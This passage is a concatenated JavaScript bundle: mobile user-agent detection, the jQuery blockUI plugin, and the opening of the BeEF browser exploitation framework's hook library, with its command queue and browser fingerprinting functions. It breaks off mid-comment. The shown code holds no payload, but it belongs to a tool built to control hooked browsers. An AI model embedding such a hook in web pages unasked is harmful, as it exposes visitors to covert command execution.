   if (uagent.search(mobile) > -1)
      return false;
   else
      return true;
}


function DetectAndroidWebKit()
{
   if (DetectAndroid() && DetectWebkit())
      return true;
   else
      return false;
}


function DetectGoogleTV()
{
   if (uagent.search(deviceGoogleTV) > -1)
      return true;
   else
      return false;
}


function DetectWebkit()
{
   if (uagent.search(engineWebKit) > -1)
      return true;
   else
      return false;
}

function DetectS60OssBrowser()
{
   if (DetectWebkit())
   {
     if ((uagent.search(deviceS60) > -1 ||
          uagent.search(deviceSymbian) > -1))
        return true;
     else
        return false;
   }
   else
      return false;
}

function DetectSymbianOS()
{
   if (uagent.search(deviceSymbian) > -1 ||
       uagent.search(deviceS60) > -1 ||
       uagent.search(deviceS70) > -1 ||
       uagent.search(deviceS80) > -1 ||
       uagent.search(deviceS90) > -1)
      return true;
   else
      return false;
}

function DetectWindowsPhone7()
{
   if (uagent.search(deviceWinPhone7) > -1)
      return true;
   else
      return false;
}

function DetectWindowsMobile()
{
   if (DetectWindowsPhone7())
      return false;
   if (uagent.search(deviceWinMob) > -1 ||
       uagent.search(deviceIeMob) > -1 ||
       uagent.search(enginePie) > -1)
      return true;
   if ((uagent.search(devicePpc) > -1) &&
       !(uagent.search(deviceMacPpc) > -1))
      return true;
   if (uagent.search(manuHtc) > -1 &&
       uagent.search(deviceWindows) > -1)
      return true;
   else
      return false;
}

function DetectBlackBerry()
{
   if (uagent.search(deviceBB) > -1)
      return true;
   if (uagent.search(vndRIM) > -1)
      return true;
   else
      return false;
}

function DetectBlackBerryTablet()
{
   if (uagent.search(deviceBBPlaybook) > -1)
      return true;
   else
      return false;
}

function DetectBlackBerryWebKit()
{
   if (DetectBlackBerry() &&
       uagent.search(engineWebKit) > -1)
      return true;
   else
      return false;
}

function DetectBlackBerryTouch()
{
   if (DetectBlackBerry() &&
        ((uagent.search(deviceBBStorm) > -1) ||
        (uagent.search(deviceBBTorch) > -1) ||
        (uagent.search(deviceBBBoldTouch) > -1) ||
        (uagent.search(deviceBBCurveTouch) > -1) ))
      return true;
   else
      return false;
}

function DetectBlackBerryHigh()
{
   if (DetectBlackBerryWebKit())
      return false;
   if (DetectBlackBerry())
   {
     if (DetectBlackBerryTouch() ||
        uagent.search(deviceBBBold) > -1 ||
        uagent.search(deviceBBTour) > -1 ||
        uagent.search(deviceBBCurve) > -1)
        return true;
     else
        return false;
   }
   else
      return false;
}

function DetectBlackBerryLow()
{
   if (DetectBlackBerry())
   {
     if (DetectBlackBerryHigh() || DetectBlackBerryWebKit())
        return false;
     else
        return true;
   }
   else
      return false;
}


function DetectPalmOS()
{
   if (uagent.search(devicePalm) > -1 ||
       uagent.search(engineBlazer) > -1 ||
       uagent.search(engineXiino) > -1)
   {
     if (DetectPalmWebOS())
        return false;
     else
        return true;
   }
   else
      return false;
}

function DetectPalmWebOS()
{
   if (uagent.search(deviceWebOS) > -1)
      return true;
   else
      return false;
}

function DetectWebOSTablet()
{
   if (uagent.search(deviceWebOShp) > -1 &&
       uagent.search(deviceTablet) > -1)
      return true;
   else
      return false;
}

function DetectGarminNuvifone()
{
   if (uagent.search(deviceNuvifone) > -1)
      return true;
   else
      return false;
}


function DetectSmartphone()
{
   if (DetectIphoneOrIpod()
      || DetectAndroidPhone()
      || DetectS60OssBrowser()
      || DetectSymbianOS()
      || DetectWindowsMobile()
      || DetectWindowsPhone7()
      || DetectBlackBerry()
      || DetectPalmWebOS()
      || DetectPalmOS()
      || DetectGarminNuvifone())
      return true;

   return false;
};

function DetectArchos()
{
   if (uagent.search(deviceArchos) > -1)
      return true;
   else
      return false;
}

function DetectBrewDevice()
{
   if (uagent.search(deviceBrew) > -1)
      return true;
   else
      return false;
}

function DetectDangerHiptop()
{
   if (uagent.search(deviceDanger) > -1 ||
       uagent.search(deviceHiptop) > -1)
      return true;
   else
      return false;
}

function DetectMaemoTablet()
{
   if (uagent.search(maemo) > -1)
      return true;
   if ((uagent.search(linux) > -1)
       && (uagent.search(deviceTablet) > -1)
       && !DetectWebOSTablet()
       && !DetectAndroid())
      return true;
   else
      return false;
}

function DetectSonyMylo()
{
   if (uagent.search(manuSony) > -1)
   {
     if (uagent.search(qtembedded) > -1 ||
         uagent.search(mylocom2) > -1)
        return true;
     else
        return false;
   }
   else
      return false;
}

function DetectOperaMobile()
{
   if (uagent.search(engineOpera) > -1)
   {
     if (uagent.search(mini) > -1 ||
         uagent.search(mobi) > -1)
        return true;
     else
        return false;
   }
   else
      return false;
}

function DetectOperaAndroidPhone()
{
   if ((uagent.search(engineOpera) > -1) &&
      (uagent.search(deviceAndroid) > -1) &&
      (uagent.search(mobi) > -1))
      return true;
   else
      return false;
}

function DetectOperaAndroidTablet()
{
   if ((uagent.search(engineOpera) > -1) &&
      (uagent.search(deviceAndroid) > -1) &&
      (uagent.search(deviceTablet) > -1))
      return true;
   else
      return false;
}

function DetectSonyPlaystation()
{
   if (uagent.search(devicePlaystation) > -1)
      return true;
   else
      return false;
};

function DetectNintendo()
{
   if (uagent.search(deviceNintendo) > -1   ||
	uagent.search(deviceWii) > -1 ||
	uagent.search(deviceNintendoDs) > -1)
      return true;
   else
      return false;
};

function DetectXbox()
{
   if (uagent.search(deviceXbox) > -1)
      return true;
   else
      return false;
};

function DetectGameConsole()
{
   if (DetectSonyPlaystation())
      return true;
   if (DetectNintendo())
      return true;
   if (DetectXbox())
      return true;
   else
      return false;
};

function DetectKindle()
{
   if (uagent.search(deviceKindle) > -1 &&
       !DetectAndroid())
      return true;
   else
      return false;
}

function DetectAmazonSilk()
{
   if (uagent.search(engineSilk) > -1)
      return true;
   else
      return false;
}

function DetectMobileQuick()
{
   if (DetectTierTablet())
      return false;

   if (DetectSmartphone())
      return true;

   if (uagent.search(deviceMidp) > -1 ||
	DetectBrewDevice())
      return true;

   if (DetectOperaMobile())
      return true;

   if (uagent.search(engineNetfront) > -1)
      return true;
   if (uagent.search(engineUpBrowser) > -1)
      return true;
   if (uagent.search(engineOpenWeb) > -1)
      return true;

   if (DetectDangerHiptop())
      return true;

   if (DetectMaemoTablet())
      return true;
   if (DetectArchos())
      return true;

   if ((uagent.search(devicePda) > -1) &&
        !(uagent.search(disUpdate) > -1))
      return true;
   if (uagent.search(mobile) > -1)
      return true;

   if (DetectKindle() ||
       DetectAmazonSilk())
      return true;

   return false;
};


function DetectMobileLong()
{
   if (DetectMobileQuick())
      return true;
   if (DetectGameConsole())
      return true;
   if (DetectSonyMylo())
      return true;

   if (uagent.search(manuSamsung1) > -1 ||
	uagent.search(manuSonyEricsson) > -1 ||
	uagent.search(manuericsson) > -1)
      return true;

   if (uagent.search(svcDocomo) > -1)
      return true;
   if (uagent.search(svcKddi) > -1)
      return true;
   if (uagent.search(svcVodafone) > -1)
      return true;


   return false;
};


function DetectTierTablet()
{
   if (DetectIpad()
        || DetectAndroidTablet()
        || DetectBlackBerryTablet()
        || DetectWebOSTablet())
      return true;
   else
      return false;
};

function DetectTierIphone()
{
   if (DetectIphoneOrIpod())
      return true;
   if (DetectAndroidPhone())
      return true;
   if (DetectBlackBerryWebKit() && DetectBlackBerryTouch())
      return true;
   if (DetectWindowsPhone7())
      return true;
   if (DetectPalmWebOS())
      return true;
   if (DetectGarminNuvifone())
      return true;
   else
      return false;
};

function DetectTierRichCss()
{
    if (DetectMobileQuick())
    {
       if (DetectTierIphone() || DetectKindle())
          return false;

       if (DetectWebkit())
          return true;
       if (DetectS60OssBrowser())
          return true;

       if (DetectBlackBerryHigh())
          return true;

       if (DetectWindowsMobile())
          return true;

       if (uagent.search(engineTelecaQ) > -1)
          return true;

       else
          return false;
    }
    else
      return false;
};

function DetectTierOtherPhones()
{
    if (DetectMobileLong())
    {
       if (DetectTierIphone() || DetectTierRichCss())
          return false;

       else
          return true;
    }
    else
      return false;
};


function InitDeviceScan()
{
    isIphone = DetectIphoneOrIpod();
    isAndroidPhone = DetectAndroidPhone();
    isTierIphone = DetectTierIphone();
    isTierTablet = DetectTierTablet();

    isTierRichCss = DetectTierRichCss();
    isTierGenericMobile = DetectTierOtherPhones();
};

try {
   InitDeviceScan();
}catch(e){}


/*!
 * jQuery blockUI plugin
 * Version 2.70.0-2014.11.23
 * Requires jQuery v1.7 or later
 *
 * Examples at: http://malsup.com/jquery/block/
 * Copyright (c) 2007-2013 M. Alsup
 * Dual licensed under the MIT and GPL licenses:
 * http://www.opensource.org/licenses/mit-license.php
 * http://www.gnu.org/licenses/gpl.html
 *
 * Thanks to Amir-Hossein Sobhi for some excellent contributions!
 */

;(function() {
/*jshint eqeqeq:false curly:false latedef:false */
"use strict";

	function setup($) {
		$.fn._fadeIn = $.fn.fadeIn;

		var noOp = $.noop || function() {};

		// this bit is to ensure we don't call setExpression when we shouldn't (with extra muscle to handle
		// confusing userAgent strings on Vista)
		var msie = /MSIE/.test(navigator.userAgent);
		var ie6  = /MSIE 6.0/.test(navigator.userAgent) && ! /MSIE 8.0/.test(navigator.userAgent);
		var mode = document.documentMode || 0;
		var setExpr = $.isFunction( document.createElement('div').style.setExpression );

		// global $ methods for blocking/unblocking the entire page
		$.blockUI   = function(opts) { install(window, opts); };
		$.unblockUI = function(opts) { remove(window, opts); };

		// convenience method for quick growl-like notifications  (http://www.google.com/search?q=growl)
		$.growlUI = function(title, message, timeout, onClose) {
			var $m = $('<div class="growlUI"></div>');
			if (title) $m.append('<h1>'+title+'</h1>');
			if (message) $m.append('<h2>'+message+'</h2>');
			if (timeout === undefined) timeout = 3000;

			// Added by konapun: Set timeout to 30 seconds if this growl is moused over, like normal toast notifications
			var callBlock = function(opts) {
				opts = opts || {};

				$.blockUI({
					message: $m,
					fadeIn : typeof opts.fadeIn  !== 'undefined' ? opts.fadeIn  : 700,
					fadeOut: typeof opts.fadeOut !== 'undefined' ? opts.fadeOut : 1000,
					timeout: typeof opts.timeout !== 'undefined' ? opts.timeout : timeout,
					centerY: false,
					showOverlay: false,
					onUnblock: onClose,
					css: $.blockUI.defaults.growlCSS
				});
			};

			callBlock();
			var nonmousedOpacity = $m.css('opacity');
			$m.mouseover(function() {
				callBlock({
					fadeIn: 0,
					timeout: 30000
				});

				var displayBlock = $('.blockMsg');
				displayBlock.stop(); // cancel fadeout if it has started
				displayBlock.fadeTo(300, 1); // make it easier to read the message by removing transparency
			}).mouseout(function() {
				$('.blockMsg').fadeOut(1000);
			});
			// End konapun additions
		};

		// plugin method for blocking element content
		$.fn.block = function(opts) {
			if ( this[0] === window ) {
				$.blockUI( opts );
				return this;
			}
			var fullOpts = $.extend({}, $.blockUI.defaults, opts || {});
			this.each(function() {
				var $el = $(this);
				if (fullOpts.ignoreIfBlocked && $el.data('blockUI.isBlocked'))
					return;
				$el.unblock({ fadeOut: 0 });
			});

			return this.each(function() {
				if ($.css(this,'position') == 'static') {
					this.style.position = 'relative';
					$(this).data('blockUI.static', true);
				}
				this.style.zoom = 1; // force 'hasLayout' in ie
				install(this, opts);
			});
		};

		// plugin method for unblocking element content
		$.fn.unblock = function(opts) {
			if ( this[0] === window ) {
				$.unblockUI( opts );
				return this;
			}
			return this.each(function() {
				remove(this, opts);
			});
		};

		$.blockUI.version = 2.70; // 2nd generation blocking at no extra cost!

		// override these in your code to change the default behavior and style
		$.blockUI.defaults = {
			// message displayed when blocking (use null for no message)
			message:  '<h1>Please wait...</h1>',

			title: null,		// title string; only used when theme == true
			draggable: true,	// only used when theme == true (requires jquery-ui.js to be loaded)

			theme: false, // set to true to use with jQuery UI themes

			// styles for the message when blocking; if you wish to disable
			// these and use an external stylesheet then do this in your code:
			// $.blockUI.defaults.css = {};
			css: {
				padding:	0,
				margin:		0,
				width:		'30%',
				top:		'40%',
				left:		'35%',
				textAlign:	'center',
				color:		'#000',
				border:		'3px solid #aaa',
				backgroundColor:'#fff',
				cursor:		'wait'
			},

			// minimal style set used when themes are used
			themedCSS: {
				width:	'30%',
				top:	'40%',
				left:	'35%'
			},

			// styles for the overlay
			overlayCSS:  {
				backgroundColor:	'#000',
				opacity:			0.6,
				cursor:				'wait'
			},

			// style to replace wait cursor before unblocking to correct issue
			// of lingering wait cursor
			cursorReset: 'default',

			// styles applied when using $.growlUI
			growlCSS: {
				width:		'350px',
				top:		'10px',
				left:		'',
				right:		'10px',
				border:		'none',
				padding:	'5px',
				opacity:	0.6,
				cursor:		'default',
				color:		'#fff',
				backgroundColor: '#000',
				'-webkit-border-radius':'10px',
				'-moz-border-radius':	'10px',
				'border-radius':		'10px'
			},

			// IE issues: 'about:blank' fails on HTTPS and javascript:false is s-l-o-w
			// (hat tip to Jorge H. N. de Vasconcelos)
			/*jshint scripturl:true */
			iframeSrc: /^https/i.test(window.location.href || '') ? 'javascript:false' : 'about:blank',

			// force usage of iframe in non-IE browsers (handy for blocking applets)
			forceIframe: false,

			// z-index for the blocking overlay
			baseZ: 1000,

			// set these to true to have the message automatically centered
			centerX: true, // <-- only effects element blocking (page block controlled via css above)
			centerY: true,

			// allow body element to be stetched in ie6; this makes blocking look better
			// on "short" pages.  disable if you wish to prevent changes to the body height
			allowBodyStretch: true,

			// enable if you want key and mouse events to be disabled for content that is blocked
			bindEvents: true,

			// be default blockUI will supress tab navigation from leaving blocking content
			// (if bindEvents is true)
			constrainTabKey: true,

			// fadeIn time in millis; set to 0 to disable fadeIn on block
			fadeIn:  200,

			// fadeOut time in millis; set to 0 to disable fadeOut on unblock
			fadeOut:  400,

			// time in millis to wait before auto-unblocking; set to 0 to disable auto-unblock
			timeout: 0,

			// disable if you don't want to show the overlay
			showOverlay: true,

			// if true, focus will be placed in the first available input field when
			// page blocking
			focusInput: true,

            // elements that can receive focus
            focusableElements: ':input:enabled:visible',

			// suppresses the use of overlay styles on FF/Linux (due to performance issues with opacity)
			// no longer needed in 2012
			// applyPlatformOpacityRules: true,

			// callback method invoked when fadeIn has completed and blocking message is visible
			onBlock: null,

			// callback method invoked when unblocking has completed; the callback is
			// passed the element that has been unblocked (which is the window object for page
			// blocks) and the options that were passed to the unblock call:
			//	onUnblock(element, options)
			onUnblock: null,

			// callback method invoked when the overlay area is clicked.
			// setting this will turn the cursor to a pointer, otherwise cursor defined in overlayCss will be used.
			onOverlayClick: null,

			// don't ask; if you really must know: http://groups.google.com/group/jquery-en/browse_thread/thread/36640a8730503595/2f6a79a77a78e493#2f6a79a77a78e493
			quirksmodeOffsetHack: 4,

			// class name of the message block
			blockMsgClass: 'blockMsg',

			// if it is already blocked, then ignore it (don't unblock and reblock)
			ignoreIfBlocked: false
		};

		// private data and functions follow...

		var pageBlock = null;
		var pageBlockEls = [];

		function install(el, opts) {
			var css, themedCSS;
			var full = (el == window);
			var msg = (opts && opts.message !== undefined ? opts.message : undefined);
			opts = $.extend({}, $.blockUI.defaults, opts || {});

			if (opts.ignoreIfBlocked && $(el).data('blockUI.isBlocked'))
				return;

			opts.overlayCSS = $.extend({}, $.blockUI.defaults.overlayCSS, opts.overlayCSS || {});
			css = $.extend({}, $.blockUI.defaults.css, opts.css || {});
			if (opts.onOverlayClick)
				opts.overlayCSS.cursor = 'pointer';

			themedCSS = $.extend({}, $.blockUI.defaults.themedCSS, opts.themedCSS || {});
			msg = msg === undefined ? opts.message : msg;

			// remove the current block (if there is one)
			if (full && pageBlock)
				remove(window, {fadeOut:0});

			// if an existing element is being used as the blocking content then we capture
			// its current place in the DOM (and current display style) so we can restore
			// it when we unblock
			if (msg && typeof msg != 'string' && (msg.parentNode || msg.jquery)) {
				var node = msg.jquery ? msg[0] : msg;
				var data = {};
				$(el).data('blockUI.history', data);
				data.el = node;
				data.parent = node.parentNode;
				data.display = node.style.display;
				data.position = node.style.position;
				if (data.parent)
					data.parent.removeChild(node);
			}

			$(el).data('blockUI.onUnblock', opts.onUnblock);
			var z = opts.baseZ;

			// blockUI uses 3 layers for blocking, for simplicity they are all used on every platform;
			// layer1 is the iframe layer which is used to supress bleed through of underlying content
			// layer2 is the overlay layer which has opacity and a wait cursor (by default)
			// layer3 is the message content that is displayed while blocking
			var lyr1, lyr2, lyr3, s;
			if (msie || opts.forceIframe)
				lyr1 = $('<iframe class="blockUI" style="z-index:'+ (z++) +';display:none;border:none;margin:0;padding:0;position:absolute;width:100%;height:100%;top:0;left:0" src="'+opts.iframeSrc+'"></iframe>');
			else
				lyr1 = $('<div class="blockUI" style="display:none"></div>');

			if (opts.theme)
				lyr2 = $('<div class="blockUI blockOverlay ui-widget-overlay" style="z-index:'+ (z++) +';display:none"></div>');
			else
				lyr2 = $('<div class="blockUI blockOverlay" style="z-index:'+ (z++) +';display:none;border:none;margin:0;padding:0;width:100%;height:100%;top:0;left:0"></div>');

			if (opts.theme && full) {
				s = '<div class="blockUI ' + opts.blockMsgClass + ' blockPage ui-dialog ui-widget ui-corner-all" style="z-index:'+(z+10)+';display:none;position:fixed">';
				if ( opts.title ) {
					s += '<div class="ui-widget-header ui-dialog-titlebar ui-corner-all blockTitle">'+(opts.title || '&nbsp;')+'</div>';
				}
				s += '<div class="ui-widget-content ui-dialog-content"></div>';
				s += '</div>';
			}
			else if (opts.theme) {
				s = '<div class="blockUI ' + opts.blockMsgClass + ' blockElement ui-dialog ui-widget ui-corner-all" style="z-index:'+(z+10)+';display:none;position:absolute">';
				if ( opts.title ) {
					s += '<div class="ui-widget-header ui-dialog-titlebar ui-corner-all blockTitle">'+(opts.title || '&nbsp;')+'</div>';
				}
				s += '<div class="ui-widget-content ui-dialog-content"></div>';
				s += '</div>';
			}
			else if (full) {
				s = '<div class="blockUI ' + opts.blockMsgClass + ' blockPage" style="z-index:'+(z+10)+';display:none;position:fixed"></div>';
			}
			else {
				s = '<div class="blockUI ' + opts.blockMsgClass + ' blockElement" style="z-index:'+(z+10)+';display:none;position:absolute"></div>';
			}
			lyr3 = $(s);

			// if we have a message, style it
			if (msg) {
				if (opts.theme) {
					lyr3.css(themedCSS);
					lyr3.addClass('ui-widget-content');
				}
				else
					lyr3.css(css);
			}

			// style the overlay
			if (!opts.theme /*&& (!opts.applyPlatformOpacityRules)*/)
				lyr2.css(opts.overlayCSS);
			lyr2.css('position', full ? 'fixed' : 'absolute');

			// make iframe layer transparent in IE
			if (msie || opts.forceIframe)
				lyr1.css('opacity',0.0);

			//$([lyr1[0],lyr2[0],lyr3[0]]).appendTo(full ? 'body' : el);
			var layers = [lyr1,lyr2,lyr3], $par = full ? $('body') : $(el);
			$.each(layers, function() {
				this.appendTo($par);
			});

			if (opts.theme && opts.draggable && $.fn.draggable) {
				lyr3.draggable({
					handle: '.ui-dialog-titlebar',
					cancel: 'li'
				});
			}

			// ie7 must use absolute positioning in quirks mode and to account for activex issues (when scrolling)
			var expr = setExpr && (!$.support.boxModel || $('object,embed', full ? null : el).length > 0);
			if (ie6 || expr) {
				// give body 100% height
				if (full && opts.allowBodyStretch && $.support.boxModel)
					$('html,body').css('height','100%');

				// fix ie6 issue when blocked element has a border width
				if ((ie6 || !$.support.boxModel) && !full) {
					var t = sz(el,'borderTopWidth'), l = sz(el,'borderLeftWidth');
					var fixT = t ? '(0 - '+t+')' : 0;
					var fixL = l ? '(0 - '+l+')' : 0;
				}

				// simulate fixed position
				$.each(layers, function(i,o) {
					var s = o[0].style;
					s.position = 'absolute';
					if (i < 2) {
						if (full)
							s.setExpression('height','Math.max(document.body.scrollHeight, document.body.offsetHeight) - (jQuery.support.boxModel?0:'+opts.quirksmodeOffsetHack+') + "px"');
						else
							s.setExpression('height','this.parentNode.offsetHeight + "px"');
						if (full)
							s.setExpression('width','jQuery.support.boxModel && document.documentElement.clientWidth || document.body.clientWidth + "px"');
						else
							s.setExpression('width','this.parentNode.offsetWidth + "px"');
						if (fixL) s.setExpression('left', fixL);
						if (fixT) s.setExpression('top', fixT);
					}
					else if (opts.centerY) {
						if (full) s.setExpression('top','(document.documentElement.clientHeight || document.body.clientHeight) / 2 - (this.offsetHeight / 2) + (blah = document.documentElement.scrollTop ? document.documentElement.scrollTop : document.body.scrollTop) + "px"');
						s.marginTop = 0;
					}
					else if (!opts.centerY && full) {
						var top = (opts.css && opts.css.top) ? parseInt(opts.css.top, 10) : 0;
						var expression = '((document.documentElement.scrollTop ? document.documentElement.scrollTop : document.body.scrollTop) + '+top+') + "px"';
						s.setExpression('top',expression);
					}
				});
			}

			// show the message
			if (msg) {
				if (opts.theme)
					lyr3.find('.ui-widget-content').append(msg);
				else
					lyr3.append(msg);
				if (msg.jquery || msg.nodeType)
					$(msg).show();
			}

			if ((msie || opts.forceIframe) && opts.showOverlay)
				lyr1.show(); // opacity is zero
			if (opts.fadeIn) {
				var cb = opts.onBlock ? opts.onBlock : noOp;
				var cb1 = (opts.showOverlay && !msg) ? cb : noOp;
				var cb2 = msg ? cb : noOp;
				if (opts.showOverlay)
					lyr2._fadeIn(opts.fadeIn, cb1);
				if (msg)
					lyr3._fadeIn(opts.fadeIn, cb2);
			}
			else {
				if (opts.showOverlay)
					lyr2.show();
				if (msg)
					lyr3.show();
				if (opts.onBlock)
					opts.onBlock.bind(lyr3)();
			}

			// bind key and mouse events
			bind(1, el, opts);

			if (full) {
				pageBlock = lyr3[0];
				pageBlockEls = $(opts.focusableElements,pageBlock);
				if (opts.focusInput)
					setTimeout(focus, 20);
			}
			else
				center(lyr3[0], opts.centerX, opts.centerY);

			if (opts.timeout) {
				// auto-unblock
				var to = setTimeout(function() {
					if (full)
						$.unblockUI(opts);
					else
						$(el).unblock(opts);
				}, opts.timeout);
				$(el).data('blockUI.timeout', to);
			}
		}

		// remove the block
		function remove(el, opts) {
			var count;
			var full = (el == window);
			var $el = $(el);
			var data = $el.data('blockUI.history');
			var to = $el.data('blockUI.timeout');
			if (to) {
				clearTimeout(to);
				$el.removeData('blockUI.timeout');
			}
			opts = $.extend({}, $.blockUI.defaults, opts || {});
			bind(0, el, opts); // unbind events

			if (opts.onUnblock === null) {
				opts.onUnblock = $el.data('blockUI.onUnblock');
				$el.removeData('blockUI.onUnblock');
			}

			var els;
			if (full) // crazy selector to handle odd field errors in ie6/7
				els = $('body').children().filter('.blockUI').add('body > .blockUI');
			else
				els = $el.find('>.blockUI');

			// fix cursor issue
			if ( opts.cursorReset ) {
				if ( els.length > 1 )
					els[1].style.cursor = opts.cursorReset;
				if ( els.length > 2 )
					els[2].style.cursor = opts.cursorReset;
			}

			if (full)
				pageBlock = pageBlockEls = null;

			if (opts.fadeOut) {
				count = els.length;
				els.stop().fadeOut(opts.fadeOut, function() {
					if ( --count === 0)
						reset(els,data,opts,el);
				});
			}
			else
				reset(els, data, opts, el);
		}

		// move blocking element back into the DOM where it started
		function reset(els,data,opts,el) {
			var $el = $(el);
			if ( $el.data('blockUI.isBlocked') )
				return;

			els.each(function(i,o) {
				// remove via DOM calls so we don't lose event handlers
				if (this.parentNode)
					this.parentNode.removeChild(this);
			});

			if (data && data.el) {
				data.el.style.display = data.display;
				data.el.style.position = data.position;
				data.el.style.cursor = 'default'; // #59
				if (data.parent)
					data.parent.appendChild(data.el);
				$el.removeData('blockUI.history');
			}

			if ($el.data('blockUI.static')) {
				$el.css('position', 'static'); // #22
			}

			if (typeof opts.onUnblock == 'function')
				opts.onUnblock(el,opts);

			// fix issue in Safari 6 where block artifacts remain until reflow
			var body = $(document.body), w = body.width(), cssW = body[0].style.width;
			body.width(w-1).width(w);
			body[0].style.width = cssW;
		}

		// bind/unbind the handler
		function bind(b, el, opts) {
			var full = el == window, $el = $(el);

			// don't bother unbinding if there is nothing to unbind
			if (!b && (full && !pageBlock || !full && !$el.data('blockUI.isBlocked')))
				return;

			$el.data('blockUI.isBlocked', b);

			// don't bind events when overlay is not in use or if bindEvents is false
			if (!full || !opts.bindEvents || (b && !opts.showOverlay))
				return;

			// bind anchors and inputs for mouse and key events
			var events = 'mousedown mouseup keydown keypress keyup touchstart touchend touchmove';
			if (b)
				$(document).bind(events, opts, handler);
			else
				$(document).unbind(events, handler);

		// former impl...
		//		var $e = $('a,:input');
		//		b ? $e.bind(events, opts, handler) : $e.unbind(events, handler);
		}

		// event handler to suppress keyboard/mouse events when blocking
		function handler(e) {
			// allow tab navigation (conditionally)
			if (e.type === 'keydown' && e.keyCode && e.keyCode == 9) {
				if (pageBlock && e.data.constrainTabKey) {
					var els = pageBlockEls;
					var fwd = !e.shiftKey && e.target === els[els.length-1];
					var back = e.shiftKey && e.target === els[0];
					if (fwd || back) {
						setTimeout(function(){focus(back);},10);
						return false;
					}
				}
			}
			var opts = e.data;
			var target = $(e.target);
			if (target.hasClass('blockOverlay') && opts.onOverlayClick)
				opts.onOverlayClick(e);

			// allow events within the message content
			if (target.parents('div.' + opts.blockMsgClass).length > 0)
				return true;

			// allow events for content that is not being blocked
			return target.parents().children().filter('div.blockUI').length === 0;
		}

		function focus(back) {
			if (!pageBlockEls)
				return;
			var e = pageBlockEls[back===true ? pageBlockEls.length-1 : 0];
			if (e)
				e.focus();
		}

		function center(el, x, y) {
			var p = el.parentNode, s = el.style;
			var l = ((p.offsetWidth - el.offsetWidth)/2) - sz(p,'borderLeftWidth');
			var t = ((p.offsetHeight - el.offsetHeight)/2) - sz(p,'borderTopWidth');
			if (x) s.left = l > 0 ? (l+'px') : '0';
			if (y) s.top  = t > 0 ? (t+'px') : '0';
		}

		function sz(el, p) {
			return parseInt($.css(el,p),10)||0;
		}

	}


	/*global define:true */
	if (typeof define === 'function' && define.amd && define.amd.jQuery) {
		define(['jquery'], setup);
	} else {
		setup(jQuery);
	}

})();


//
// Copyright (c) 2006-2015 Wade Alcorn - wade@bindshell.net
// Browser Exploitation Framework (BeEF) - http://beefproject.com
// See the file 'doc/COPYING' for copying permission
//

/*!
 * BeEF JS Library 0.4.7.0-alpha
 * Register the BeEF JS on the window object.
 */

$j = jQuery.noConflict();

if(typeof beef === 'undefined' && typeof window.beef === 'undefined') {
	
	var BeefJS = {
		
		version: '0.4.7.0-alpha',
		
		// This get set to true during window.onload(). It's a useful hack when messing with document.write().
		pageIsLoaded: false,
		
		// An array containing functions to be executed by the window.onpopstate() method.
		onpopstate: new Array(),
		
		// An array containing functions to be executed by the window.onclose() method.
		onclose: new Array(),
		
		// An array containing functions to be executed by Beef.
		commands: new Array(),
		
		// An array containing all the BeEF JS components.
		components: new Array(),

                /**
                 * Adds a function to display debug messages (wraps console.log())
                 * @param: {string} the debug string to return
                 */
                debug: function(msg) {
                    if (!false) return;
                    if (typeof console == "object" && typeof console.log == "function") {
                        console.log(msg);
                    } else {
                        // TODO: maybe add a callback to BeEF server for debugging purposes
                        //window.alert(msg);
                    }
                },

		/**
		 * Adds a function to execute.
		 * @param: {Function} the function to execute.
		 */
		execute: function(fn) {
            if ( typeof  beef.websocket == "undefined"){
                 this.commands.push(fn);
            }else{
                fn();
            }
        },



		/**
		 * Registers a component in BeEF JS.
		 * @params: {String} the component.
		 *
		 * Components are very important to register so the framework does not
		 * send them back over and over again.
		 */
		regCmp: function(component) {
			this.components.push(component);
		}
	
    };
	
	window.beef = BeefJS;
}


//
// Copyright (c) 2006-2015 Wade Alcorn - wade@bindshell.net
// Browser Exploitation Framework (BeEF) - http://beefproject.com
// See the file 'doc/COPYING' for copying permission
//

/**
 * @literal object: beef.browser
 *
 * Basic browser functions.
 */
beef.browser = {

    /**
     * Returns the user agent that the browser is claiming to be.
     * @example: beef.browser.getBrowserReportedName()
     */
    getBrowserReportedName: function () {
        return navigator.userAgent;
    },

    /**
     * Returns true if Avant Browser.
     * @example: beef.browser.isA()
     */
    isA: function () {
        return window.navigator.userAgent.match(/Avant TriCore/) != null;
    },

    /**
     * Returns true if Iceweasel.
     * @example: beef.browser.isI()
     */
    isI: function () {
        return window.navigator.userAgent.match(/Iceweasel\/\d+\.\d/) != null;
    },

    /**
     * Returns true if IE6.
     * @example: beef.browser.isIE6()
     */
    isIE6: function () {
        return !window.XMLHttpRequest && !window.globalStorage;
    },

    /**
     * Returns true if IE7.
     * @example: beef.browser.isIE7()
     */
    isIE7: function () {
        return !!window.XMLHttpRequest && !window.chrome && !window.opera && !window.getComputedStyle && !window.globalStorage && !document.documentMode;
    },

    /**
     * Returns true if IE8.
     * @example: beef.browser.isIE8()
     */
    isIE8: function () {
        return !!window.XMLHttpRequest && !window.chrome && !window.opera && !!document.documentMode && !!window.XDomainRequest && !window.performance;
    },

    /**
     * Returns true if IE9.
     * @example: beef.browser.isIE9()
     */
    isIE9: function () {
        return !!window.XMLHttpRequest && !window.chrome && !window.opera && !!document.documentMode && !window.XDomainRequest && !!window.performance && typeof navigator.msMaxTouchPoints === "undefined";
    },

    /**
     *
     * Returns true if IE10.
     * @example: beef.browser.isIE10()
     */
    isIE10: function () {
        return !!window.XMLHttpRequest && !window.chrome && !window.opera && !!document.documentMode && !!window.XDomainRequest && !!window.performance && typeof navigator.msMaxTouchPoints !== "undefined";
    },

    /**
     *
     * Returns true if IE11.
     * @example: beef.browser.isIE11()
     */
    isIE11: function () {
        return !!window.XMLHttpRequest && !window.chrome && !window.opera && !!document.documentMode && !!window.performance && typeof navigator.msMaxTouchPoints !== "undefined" && typeof document.selection === "undefined" && typeof document.createStyleSheet === "undefined" && typeof window.createPopup === "undefined" && typeof window.XDomainRequest === "undefined";
    },

    /**
     * Returns true if IE.
     * @example: beef.browser.isIE()
     */
    isIE: function () {
        return this.isIE6() || this.isIE7() || this.isIE8() || this.isIE9() || this.isIE10() || this.isIE11();
    },

    /**
     * Returns true if FF2.
     * @example: beef.browser.isFF2()
     */
    isFF2: function () {
        return !!window.globalStorage && !window.postMessage;
    },

    /**
     * Returns true if FF3.
     * @example: beef.browser.isFF3()
     */
    isFF3: function () {
        return !!window.globalStorage && !!window.postMessage && !JSON.parse;
    },

    /**
     * Returns true if FF3.5.
     * @example: beef.browser.isFF3_5()
     */
    isFF3_5: function () {
        return !!window.globalStorage && !!JSON.parse && !window.FileReader;
    },

    /**
     * Returns true if FF3.6.
